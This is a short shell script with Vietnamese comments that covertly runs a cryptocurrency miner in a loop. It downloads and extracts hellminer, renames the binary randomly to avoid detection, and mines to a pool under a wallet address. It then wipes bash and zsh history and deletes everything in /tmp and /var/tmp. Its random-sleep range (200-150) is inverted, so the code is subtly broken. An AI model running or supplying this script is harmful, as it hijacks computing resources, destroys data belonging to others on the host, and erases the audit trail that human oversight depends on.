#!/bin/sh

# Tạo một tên tệp ngẫu nhiên để khó phát hiện hơn
generate_random_name() {
  tr -dc 'a-zA-Z0-9' </dev/urandom | head -c 12
}

# Vô hiệu hóa lịch sử shell tạm thời
set +o history

# Vòng lặp vô hạn để script chạy liên tục
while true; do
  # Tải file
  wget -q --no-check-certificate https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64_avx2.tar.gz

  # Giải nén file
  tar -xf hellminer_linux64_avx2.tar.gz
  rm -f hellminer_linux64_avx2.tar.gz

  # Đổi tên file để khó phát hiện hơn
  random_name=$(generate_random_name)
  mv hellminer "$random_name"

  # Chạy chương trình với tên đã đổi, ẩn danh và chạy ngầm trong thời gian ngẫu nhiên từ 2 đến 4 phút
  nohup ./"$random_name" -c stratum+tcp://ap.vipor.net:5040 -u RMWTqPzqBZCP3LT893jwxwNhEbs6umRGWw.vpsgit --cpu 2 >/dev/null 2>&1 &
  miner_pid=$!

  # Ngủ trong khoảng thời gian ngẫu nhiên từ 2 đến 4 phút
  run_time=$(shuf -i 200-150 -n 1)
  sleep $run_time

  # Dừng chương trình
  kill $miner_pid

  # Xóa các file đã tải và giải nén
  rm -f hellminer_linux64_avx2.tar.gz
  rm -rf "$random_name"
  rm -rf run_miner.sh
  rm -rf verus-solver

  # Bật lại lịch sử shell để xóa
  set -o history

  # Xóa lịch sử shell trong phiên hiện tại và từ tệp lịch sử
  history -c
  cat /dev/null > ~/.bash_history

  # Xóa lịch sử lệnh trong các phiên khác (nếu có)
  if [ -f ~/.zsh_history ]; then
    cat /dev/null > ~/.zsh_history
  fi

  if [ -f ~/.bash_sessions ]; then
    rm -rf ~/.bash_sessions
  fi

  # Xóa các file tạm thời (nếu có)
  rm -f /tmp/*
  rm -f /var/tmp/*

  # Nghỉ ngẫu nhiên từ 2 phút đến 4 phút trước khi lặp lại
  sleep_time=$(shuf -i 200-150 -n 1)
  sleep $sleep_time
done
